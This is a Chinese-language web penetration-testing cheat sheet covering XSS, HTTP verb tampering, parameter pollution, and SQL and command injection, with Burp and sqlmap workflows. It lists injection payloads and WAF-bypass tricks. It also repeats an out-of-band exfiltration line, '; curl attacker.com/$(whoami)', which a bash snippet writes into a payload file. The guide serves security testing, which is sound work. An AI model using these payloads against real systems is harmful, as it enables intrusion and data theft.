# 输入校验与注入：XSS、动词篡改、参数污染、SQL/命令注入

## 一句话定义
把所有用户输入当"潜在指令"去挑衅：**XSS** 进页面执行、**HTTP 动词篡改** 绕过限制、**参数污染(HPP)** 制造歧义、**SQL/命令注入** 进数据库/系统层执行。

## 核心架构 / 工作原理

```mermaid
graph TD
  A[注入类漏洞测试] --> B[XSS 跨站脚本]
  B --> B1[反射型: URL 参数 -> 响应回显 -> 受害者点链接触发]
  B --> B2[存储型: 入库 -> 展示页 -> 所有访问者中招]
  B --> B3[DOM 型: 客户端 JS 读 URL/存储 -> 危险接收器]
  B --> B4[测试点: 所有回显点/入库点/JS 接收器]
  
  A --> C[HTTP 动词篡改]
  C --> C1[GET -> POST/PUT/DELETE/PATCH]
  C --> C2[绕过: 前端只限 GET/后端全收/鉴权只查 GET]
  C --> C3[测试: Repeater 改方法 -> 看是否越权/绕过]
  
  A --> D[HTTP 参数污染 HPP]
  D --> D1[同参数多值: ?id=1&id=2]
  D --> D2[后端取值差异: 取第一个/最后一个/数组/拼接]
  D --> D3[利用: 绕过 WAF/逻辑/鉴权]
  
  A --> E[SQL 注入]
  E --> E1[报错型: 单引号 ' -> 报错回显结构]
  E --> E2[联合查询: UNION SELECT -> 回显数据]
  E --> E3[盲注: 布尔/时间 -> 无回显靠延时/差异判断]
  E --> E4[二阶注入: 存入 -> 后续查询触发]
  
  A --> F[命令注入]
  F --> F1[注入点: ping/traceroute/导出/转码/备份等调系统命令]
  F --> F2[Payload: ; | & $() ` || && newline]
  F --> F3[盲命令执行: DNS 外带/延时/文件写入]
```

| 漏洞类型 | 典型入口 | 核心 Payload 示例 | 判定成功标准 |
|----------|----------|-------------------|--------------|
| **反射 XSS** | 搜索/跳转/报错页 URL 参数 | `<script>alert(1)</script>` `<img src=x onerror=alert(1)>` `javascript:alert(1)` | 响应原样回显且浏览器执行 |
| **存储 XSS** | 评论/留言/资料/工单/文件名 | 同上 + 跨页面持久化 | 发帖后访问列表/详情页自动弹窗 |
| **动词篡改** | 任何有副作用的接口 | `GET /api/delete?id=1` → `POST /api/delete?id=1` | 方法改后仍执行/越权 |
| **HPP** | 多参数/数组参数/查询接口 | `?user=admin&user=victim` `?ids[]=1&ids[]=2` | 后端取值不符预期导致越权/绕过 |
| **SQLi** | 所有入参(ID/搜过滤/登录/排序) | `'` `' OR 1=1--` `UNION SELECT null,version()--` `SLEEP(5)` | 报错回显/数据回显/延时/外带 |
| **命令注入** | 执行系统命令的功能 | `;id` `|id` `$(id)` `; curl attacker.com/$(whoami)` | 命令执行回显/外带/文件写入 |

## 快速上手步骤

1. **测 XSS**：
   - 找所有回显点(搜索结果、报错页、用户资料、评论列表)
   - Repeater 注入 Payload → 看响应是否原样回显/未编码/未 CSP 拦截
   - 存储型：提交含 Payload 内容 → 访问展示页验证
   - DOM 型：用浏览器 Console + DOM Invader(Burp 内置浏览器)追踪 source→sink
2. **测动词篡改**：
   - 列出所有写接口(增/删/改/状态变更)
   - Repeater 逐个改 Method(GET/POST/PUT/DELETE/PATCH/OPTIONS) → 发送
   - 看：200 执行成功/405 Method Not Allowed/403/鉴权差异
3. **测 HPP**：
   - 找数组/多值参数(`ids[]` `user_ids` `tags`) → 加同名参数不同值
   - 观察后端逻辑：取第一个? 最后一个? 数组? 拼接?
   - 利用场景：`/api/user?role=user&role=admin` 绕过权限
4. **测 SQLi**：
   - 单引号 `'` 判断报错 → 确定注入点
   - 判断类型：数字型/字符型/搜索型/LIKE 型/ORDER BY 型
   - 逐步推进：列数 → 库表名 → 字段名 → 数据
   - 盲注：Intruder + Grep-match(布尔) / 延时(SLEEP/pg_sleep/WAITFOR)
   - 工具联动：发现点 → 送 sqlmap(`-r request.txt --batch --dbs`)
5. **测命令注入**：
   - 找功能：ping、nslookup、导出 PDF/图片、备份、转码、文件操作
   - 注入分隔符测试：`;id` `|id` `&&id` `$(id)` `` `id` `` `%0aid`
   - 无回显：DNS 外带 `; curl attacker.com/$(whoami)`、延时 `; sleep 5`

```bash
# sqlmap 快速验证
sqlmap -r request.txt -p "vuln_param" --batch --dbs --level 3 --risk 2
# 生成命令注入 Payload 列表
echo -e ";id\n|id\n&&id\n\$(id)\n\`id\`\n%0aid\n; sleep 5\n; curl http://attacker.com/\$(whoami)" > cmd_payloads.txt
```

## 踩坑避坑指南

| 场景 | 问题现象 | 原因 | 解决/最佳实践 |
|------|----------|------|---------------|
| 页面不回显以为安全 | 忽略盲注/盲命令执行 | 无回显 ≠ 不可利用 | **必须测盲注/盲命令**：布尔盲注、时间盲注、DNS 外带、文件写入验证 |
| 只测一个参数 | 忽略 Header/Cookie/JSON 字段 | 测试面窄 | **全入口覆盖**：URL Query、Body(form/JSON/XML)、Header、Cookie、路径参数 |
| WAF 拦了就放弃 | 403/拦截页/参数被净化 | WAF 规则可绕过 | 编码绕过(URL/双重/Unicode/十六进制)、大小写混淆、注释分隔、HTTP 参数污染、分块传输 |
| 只测 GET 参数 | 忽略 POST Body/JSON | 认知盲区 | **所有 HTTP 方法/内容类型全测** |
| SQLmap 直接跑不加参数 | 扫得慢/把库锁死/报错多 | 无目标/配置不当 | **先手工确认注入点/类型** → 再给 sqlmap 指定参数/技术/线程/延迟 |

## 替代方案对比

| 维度 | Burp 手测注入 | sqlmap | Nuclei | 代码审计/SAST |
|------|---------------|--------|--------|---------------|
| 发现准确率 | 高(人工判断) | 高(自动化) | 中(模板匹配) | 高(源码级) |
| 盲注/复杂场景 | ✅ 灵活处理 | ✅ 强 | ⚠️ 模板依赖 | ✅ 全覆盖 |
| 业务上下文结合 | ✅ 强(懂业务) | ❌ 无 | ❌ 无 | ✅ 强 |
| 速度 | 慢 | 快 | 极快 | 中 |
| 适合阶段 | 精准验证/复杂逻辑 | 批量确认/挖掘 | CI/CD 门禁 | 开发期/上线前 |
